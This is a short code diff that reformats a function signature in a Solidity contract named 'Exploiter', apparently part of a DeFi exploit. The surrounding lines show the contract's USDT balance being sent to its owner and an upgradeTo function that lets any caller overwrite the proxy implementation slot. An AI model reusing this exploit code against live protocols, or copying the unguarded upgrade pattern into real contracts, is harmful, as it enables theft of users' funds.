@@ -65,7 +65,9 @@ contract Exploiter {
         USDT.transfer(owner, USDT.balanceOf(address(this)));
     }
 
-    function upgradeTo(address newImplementation) external {
+    function upgradeTo(
+        address newImplementation
+    ) external {
         bytes32 slot = IMPLEMENTATION_SLOT;
         assembly {
             sstore(slot, newImplementation)
